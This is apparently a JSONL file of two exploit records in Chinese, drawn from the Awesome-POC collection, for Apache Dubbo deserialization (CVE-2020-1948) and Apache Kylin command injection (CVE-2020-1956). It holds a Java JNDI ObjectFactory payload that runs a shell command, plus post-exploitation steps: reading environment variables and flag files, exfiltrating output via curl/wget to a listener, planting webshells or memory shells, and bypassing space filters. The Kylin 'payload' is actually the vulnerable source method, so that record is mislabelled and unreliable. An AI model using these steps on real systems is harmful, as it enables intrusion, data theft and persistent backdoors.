{"id": "awesome-poc:cve-2020-1948", "kind": "poc", "title": "Apache Dubbo Hessian 反序列化漏洞 CVE-2020-1948", "technique": "deserialization", "summary": "开发框架漏洞 / CVE-2020-1948。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-1948 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["开发框架漏洞", "CVE-2020-1948"], "payload_template": "import javax.naming.spi.ObjectFactory;\nimport javax.naming.Name;\nimport javax.naming.Context;\nimport java.util.Hashtable;\nimport java.io.IOException;\n\npublic class exp implements ObjectFactory {\n    @Override\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        try {\n            Runtime.getRuntime().exec(\"touch /tmp/success\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-1948 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["反序列化成功的第一件事是确认命令回显通道：DNS/HTTP 外带或直接 `id` 回显，两者都没有就先解决回显再谈 flag。", "有回显后立刻 `printenv`、`ls -la /`、`cat /flag*`；无反显则写文件到 webroot 再访问。", "命令执行不稳时改用文件写入（内存马/webshell），一次写入可反复使用，比每次都重建 gadget 链便宜。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 开发框架漏洞/Apache Dubbo Hessian 反序列化漏洞 CVE-2020-1948.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2020-1956:3", "kind": "poc", "title": "Apache Kylin CubeService.java 命令注入漏洞 CVE-2020-1956", "technique": "injection", "summary": "中间件漏洞 / CVE-2020-1956。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-1956 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["中间件漏洞", "CVE-2020-1956"], "payload_template": "@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN\n            + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\")\n    public void migrateCube(CubeInstance cube, String projectName) {\n        KylinConfig config = cube.getConfig();\n        if (!config.isAllowAutoMigrateCube()) {\n            throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\");\n        }\n\n        for (CubeSegment segment : cube.getSegments()) {\n            if (segment.getStatus() != SegmentStatusEnum.READY) {\n                throw new InternalErrorException(\n                        \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\");\n            }\n        }\n\n        String srcCfgUri = config.getAutoMigrateCubeSrcConfig();\n        String dstCfgUri = config.getAutoMigrateCubeDestConfig();\n\n        Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\");\n        Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\");\n\n        String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\");\n        String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri,\n                cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge());\n\n        logger.info(\"One click migration cmd: \" + cmd);\n\n        CliCommandExecutor exec = new CliCommandExecutor();\n        PatternedLogger patternedLogger = new PatternedLogger(logger);\n\n        try {\n            exec.execute(cmd, patternedLogger);\n        } catch (IOException e) {\n            throw new InternalErrorException(\"Failed to perform one-click migrating\", e);\n        }\n    }", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-1956 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["命令注入先解决回显：`sh -c 'CMD 2>&1 | base64'` 本地解码，或用 `%09`/`${IFS}` 绕空格过滤。", "回显通了立刻 `id`、`printenv`、`ls -la /`、`cat /flag*`，顺序固定，不要先翻目录。", "无回显就外带（curl/wget 到自己的监听）或写文件到 webroot。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 中间件漏洞/Apache Kylin CubeService.java 命令注入漏洞 CVE-2020-1956.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
